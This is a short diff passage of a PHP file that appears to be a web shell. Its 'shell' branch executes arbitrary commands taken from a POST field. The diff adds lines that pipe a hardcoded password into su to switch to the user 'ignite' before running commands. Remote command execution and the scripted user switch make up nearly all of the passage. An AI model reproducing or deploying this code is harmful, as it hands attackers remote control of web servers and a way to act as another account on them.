@@ -83,6 +83,8 @@ if (isset($_GET["feature"])) {
 
     switch ($_GET["feature"]) {
         case "shell":
+            $cmd = "echo password | su - ignite -c \""."cd /"."\"";
+            exec($cmd, $stdout);
             $cmd = $_POST['cmd'];
             if (!preg_match('/2>/', $cmd)) {
                 $cmd .= ' 2>&1';
